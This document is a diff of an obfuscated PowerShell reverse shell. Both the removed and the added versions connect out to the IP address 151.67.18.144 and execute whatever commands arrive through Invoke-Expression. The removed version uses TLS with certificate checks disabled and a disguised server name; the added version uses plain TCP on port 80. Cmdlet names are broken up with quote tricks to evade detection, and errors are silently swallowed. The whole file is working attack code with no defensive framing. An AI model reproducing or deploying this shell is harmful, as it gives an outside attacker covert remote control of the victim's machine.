@@ -1,11 +1,57 @@
-$106ba2b0e031448bba2be9f09632d27f= [System.Security.Authentication.SslProtocols]::Tls12; 
-$c142ec7d1ad04c64bfb6f8860edcb2e8= N''ew-Ob''je''c''t Net.Sockets.TCPClient('151.67.18.144', 9001);
-$14c7ec222b174d8288c407db58c1367b= $c142ec7d1ad04c64bfb6f8860edcb2e8.GetStream();
-$d91e25d826e0408ba6175f16e434b031= New''-''O''b''j''ec''t Net.Security.SslStream($14c7ec222b174d8288c407db58c1367b,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
-$d91e25d826e0408ba6175f16e434b031.AuthenticateAsClient('cloudflare-dns.com',$null,$106ba2b0e031448bba2be9f09632d27f,$false);
-if(!$d91e25d826e0408ba6175f16e434b031.IsEncrypted -or !$d91e25d826e0408ba6175f16e434b031.IsSigned) {$d91e25d826e0408ba6175f16e434b031.Close();exit}$c5f63f8b8cf04d228e360b6e6d063a20 = N''e''w''-''O''b''j''e''c''t IO.StreamWriter($d91e25d826e0408ba6175f16e434b031);
-function WriteToStream ($String) {[byte[]]$script:Buffer = N''ew''-''O''bj''e''c''t System.Byte[] 4096 ;
-$c5f63f8b8cf04d228e360b6e6d063a20.Write($String + 'SHELL> ');
-$c5f63f8b8cf04d228e360b6e6d063a20.Flush()};
-WriteToStream '';
-while(($c327187d0e2749e7ac0b0998b573965d = $d91e25d826e0408ba6175f16e434b031.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$ab021f4c7a6d4f1fb9af3de9458b8106= ([text.encoding]::UTF8).GetString($Buffer, 0, $c327187d0e2749e7ac0b0998b573965d - 1);$0c25e7324fcb4f129887aad3e879912f = try {In''v''ok''e-''Ex''pr''es''s''io''n $ab021f4c7a6d4f1fb9af3de9458b8106 2>&1 | Out-S''tring} catch {$_ | Out''-S''trin''g}WriteToStream ($0c25e7324fcb4f129887aad3e879912f)}$c5f63f8b8cf04d228e360b6e6d063a20.Close()
+$f32aea7d3a41422c99bf2cf5694df021= "151.67.18.144"; 
+$f443ab75450d4a9fa14fd16473b86b1c= 80; 
+$33ea76c046f74167b5aef2ccf3a4b619= N''ew-Obje''ct Net.Sockets.TCPClient($f32aea7d3a41422c99bf2cf5694df021, $f443ab75450d4a9fa14fd16473b86b1c); 
+$a1f80ca539ec494bb409cd46e11b91d5= $33ea76c046f74167b5aef2ccf3a4b619.GetStream(); 
+$452cacd953f844b696d1f1e6d9fff5db= New''-O''bj''ect IO.StreamWriter($a1f80ca539ec494bb409cd46e11b91d5); 
+$452cacd953f844b696d1f1e6d9fff5db.AutoFlush= $true; 
+$56bf5c0506ba46fbbc80698e10a40082= Ne''w''-Obj''ec''t System.Byte[] 65536; 
+$d59df7aacb134ffaa430919d4e03412a= "";
+$b7a901a29ef8478d845635358b86f3bf= $false;
+
+while ($33ea76c046f74167b5aef2ccf3a4b619.Connected) { 
+    try {
+        # Invia p''romp''t ALLA FINE dell'output precedente (o all'inizio)
+        if (-not $b7a901a29ef8478d845635358b86f3bf) {
+            $3351a358fe014f23ba2272d6e60c951b= "PS $((Get-Location).Path)> ";
+            $12761e7a4a1c4e15a619b8c42eb0c227= [text.encoding]::UTF8.GetBytes($3351a358fe014f23ba2272d6e60c951b);
+            $a1f80ca539ec494bb409cd46e11b91d5.Write($12761e7a4a1c4e15a619b8c42eb0c227, 0, $12761e7a4a1c4e15a619b8c42eb0c227.Length);
+            $b7a901a29ef8478d845635358b86f3bf= $true;
+        }
+        
+        $bedcec7803b342b7885a28d7fd3756a1= 0;
+        $6120a20848d14af9ad2e945876a56ca4= $a1f80ca539ec494bb409cd46e11b91d5.Read($56bf5c0506ba46fbbc80698e10a40082, $bedcec7803b342b7885a28d7fd3756a1, $56bf5c0506ba46fbbc80698e10a40082.Length - $bedcec7803b342b7885a28d7fd3756a1);
+        if ($6120a20848d14af9ad2e945876a56ca4 -eq 0) { continue }
+        $bedcec7803b342b7885a28d7fd3756a1 += $6120a20848d14af9ad2e945876a56ca4;
+        
+        while ($a1f80ca539ec494bb409cd46e11b91d5.DataAvailable -and $bedcec7803b342b7885a28d7fd3756a1 -lt $56bf5c0506ba46fbbc80698e10a40082.Length - 1) {
+            $6120a20848d14af9ad2e945876a56ca4= $a1f80ca539ec494bb409cd46e11b91d5.Read($56bf5c0506ba46fbbc80698e10a40082, $bedcec7803b342b7885a28d7fd3756a1, $56bf5c0506ba46fbbc80698e10a40082.Length - $bedcec7803b342b7885a28d7fd3756a1);
+            if ($6120a20848d14af9ad2e945876a56ca4 -eq 0) { break }
+            $bedcec7803b342b7885a28d7fd3756a1 += $6120a20848d14af9ad2e945876a56ca4;
+        }
+        
+        if ($bedcec7803b342b7885a28d7fd3756a1 -gt 0) {
+            $d59df7aacb134ffaa430919d4e03412a = ([text.encoding]::UTF8).GetString($56bf5c0506ba46fbbc80698e10a40082, 0, $bedcec7803b342b7885a28d7fd3756a1).Trim();
+            
+            if ($d59df7aacb134ffaa430919d4e03412a.Length -gt 0 -and $d59df7aacb134ffaa430919d4e03412a -ne "") {
+                $b7a901a29ef8478d845635358b86f3bf= $false;  # Resetta per prossimo p''r''o''m''p''t dopo output
+                
+                $72b6805332c84c96b3bdf64fd8370bed= try { 
+                    In''v''oke''-''E''x''p''r''e''s''s''i''on $d59df7aacb134ffaa430919d4e03412a 2>&1 | Ou''t-Str''in''g
+                } catch { 
+                    "ERRORE: $($_.Exception.Message)`n"
+                }; 
+                
+                if ($72b6805332c84c96b3bdf64fd8370bed -and $72b6805332c84c96b3bdf64fd8370bed.Trim() -ne "") {
+                    $72b6805332c84c96b3bdf64fd8370bed= $72b6805332c84c96b3bdf64fd8370bed.TrimEnd();
+                    $4ff6a6a105594ab0a26eb5bea9b5b6a9= [text.encoding]::UTF8.GetBytes("$72b6805332c84c96b3bdf64fd8370bed`n");
+                    $a1f80ca539ec494bb409cd46e11b91d5.Write($4ff6a6a105594ab0a26eb5bea9b5b6a9, 0, $4ff6a6a105594ab0a26eb5bea9b5b6a9.Length);
+                }
+            }
+        }
+    } catch {
+        # Silenzioso
+    }
+    St''art-''S''le''ep -Milliseconds 50;
+}
+
+$33ea76c046f74167b5aef2ccf3a4b619.Close(); $a1f80ca539ec494bb409cd46e11b91d5.Close(); $452cacd953f844b696d1f1e6d9fff5db.Close()
